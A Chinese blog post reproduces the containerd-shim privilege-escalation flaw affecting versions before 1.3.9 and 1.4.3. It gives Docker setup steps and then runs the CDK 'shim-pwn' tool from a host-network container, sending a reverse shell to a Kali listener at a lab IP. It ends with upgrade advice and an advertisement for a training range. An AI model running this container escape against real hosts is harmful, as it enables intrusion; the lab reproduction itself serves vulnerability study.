# **0x00简介**

containerd是容器虚拟化技术，从docker中剥离出来，形成开放容器接口（OCI）标准的一部分。docker对容器的管理和操作基本都是通过containerd完成的。Containerd
是一个工业级标准的容器运行时，它强调简单性、健壮性和可移植性。Containerd
可以在宿主机中管理完整的容器生命周期：容器镜像的传输和存储、容器的执行和管理、存储和网络等。Containerd 负责干下面这些事情：

•管理容器的生命周期(从创建容器到销毁容器)

•拉取/推送容器镜像

•存储管理(管理镜像及容器数据的存储)

•调用 runC 运行容器(与 runC 等容器运行时交互)

•管理容器网络接口及网络

#  **0x01漏洞概述**

containerd在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。

#  **0x02影响范围**

containerd < 1.4.3

containerd < 1.3.9

#  **0x03环境搭建**

docker安装后containerd默认已安装，所以这里直接安装docker

环境：Ubuntu16.04

1.更新apt 包索引

sudo apt-get update

![1611627164_600f7a9ccd49ec298fc28.png!small](https://image.3001.net/images/20210126/1611627164_600f7a9ccd49ec298fc28.png!small)

2.安装 apt 依赖包，用于通过HTTPS来获取仓库

sudo apt-get install \

apt-transport-https \

ca-certificates \

curl \

gnupg-agent \

software-properties-common

![1611627154_600f7a926be5123e3741f.png!small](https://image.3001.net/images/20210126/1611627154_600f7a926be5123e3741f.png!small)

3.添加 Docker 的官方 GPG 密钥：

curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
![1611627170_600f7aa2179b94bc60529.png!small](https://image.3001.net/images/20210126/1611627170_600f7aa2179b94bc60529.png!small)

4\. 使用以下指令设置稳定版仓库

sudo add-apt-repository \

"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \

$(lsb_release -cs) \

stable"

![1611627179_600f7aabbcd923df1b42e.png!small](https://image.3001.net/images/20210126/1611627179_600f7aabbcd923df1b42e.png!small)

4.这里在更新 下apt 包索引

5.使用以下命令安装指定版本的docker

apt-cache madison docker-ce

![1611627184_600f7ab00fadde6817345.png!small](https://image.3001.net/images/20210126/1611627184_600f7ab00fadde6817345.png!small)

6.安装指定版本 //等号后面为版本号

sudo apt-get install docker-ce=5:19.03.8~3-0~ubuntu-xenial

![1611627188_600f7ab42cd65d30650ad.png!small](https://image.3001.net/images/20210126/1611627188_600f7ab42cd65d30650ad.png!small)

7.安装完成使用docker version查看版本信息

![1611627191_600f7ab7debf084e16666.png!small](https://image.3001.net/images/20210126/1611627191_600f7ab7debf084e16666.png!small)

#  **0x04漏洞复现**

1\. 漏洞利用使用github上的poc进行复现

poc下载地址：https://github.com/cdk-team/CDK/releases/tag/0.1.6

2.下载完成后查看虚拟机内核版本，将poc中对应的版本传到虚拟机中

![1611627199_600f7abf9bbe6ae1427cf.png!small](https://image.3001.net/images/20210126/1611627199_600f7abf9bbe6ae1427cf.png!small)

![1611627202_600f7ac2060532553b6b6.png!small](https://image.3001.net/images/20210126/1611627202_600f7ac2060532553b6b6.png!small)

3.然后通过--net=host 作为启动参数来运行一个容器

注：--net=host以后就不需要再做端口映射了，另外会使得创建的容器进入命令行好名称显示为主机的名称而不是一串id

![1611627205_600f7ac595897bdca2901.png!small](https://image.3001.net/images/20210126/1611627205_600f7ac595897bdca2901.png!small)

![1611627209_600f7ac99f01d99a191f4.png!small](https://image.3001.net/images/20210126/1611627209_600f7ac99f01d99a191f4.png!small)

4.把poc拷贝到容器里

docker cp cdk_linux_386 容器ID:/tmp

![1611627216_600f7ad00d97edfef0155.png!small](https://image.3001.net/images/20210126/1611627216_600f7ad00d97edfef0155.png!small)

![1611627221_600f7ad576a02f6d59b20.png!small](https://image.3001.net/images/20210126/1611627221_600f7ad576a02f6d59b20.png!small)

5.在kali上使用nc监听，在容器执行poc即可看到kali反弹的shell

./cdk_linux_386 run shim-pwn 172.16.1.132 8887

![1611627225_600f7ad99ea0b7a752701.png!small](https://image.3001.net/images/20210126/1611627225_600f7ad99ea0b7a752701.png!small)

![1611627229_600f7add1fff08af977f1.png!small](https://image.3001.net/images/20210126/1611627229_600f7add1fff08af977f1.png!small)

#  **0x05 修复建议**

建议升级 containerd 至最新版本。

参考链接：https://blog.csdn.net/xuandao_ahfengren/article/details/111819611

在这里，给大家介绍一下“东塔攻防世界靶场”

2020年12月，东塔攻防世界靶场正式对外提供注册，各位小伙伴可通过注册后进行体验。新注册用户可获得一定的积分，对于靶场使用获取正确的Key后，也可以获取一定的经验值，经验值根据排名会不定期给予一定的奖励。

并且，在操作过程中，针对出现的Bug和安全漏洞问题可以和塔塔子提出，审核通过后可以获得相应的奖励积分。

东塔攻防世界网站不定时推出可免费限时使用的靶场，具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服了解详情。

东塔攻防世界靶场主要分为在线靶场和职业体系两大特色板块。且平台内的靶场会定期更新内容，尤其是最新漏洞复现的一些文章和靶场，会优先在靶场中提供环境让大家体验。

东塔攻防世界网站会不定期限时免费推出最新的一些复现的靶场，以供学习交流，给了大家充分体验和使用靶场的机会。

具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服wx（dongtakefu）了解详情。

除了以上介绍的内容，还有更多宝藏区域，更强大的功能，等你来寻宝！

详戳下方“东塔攻防世界靶场”网址，Get一波新世界

https://labs.do-ta.com

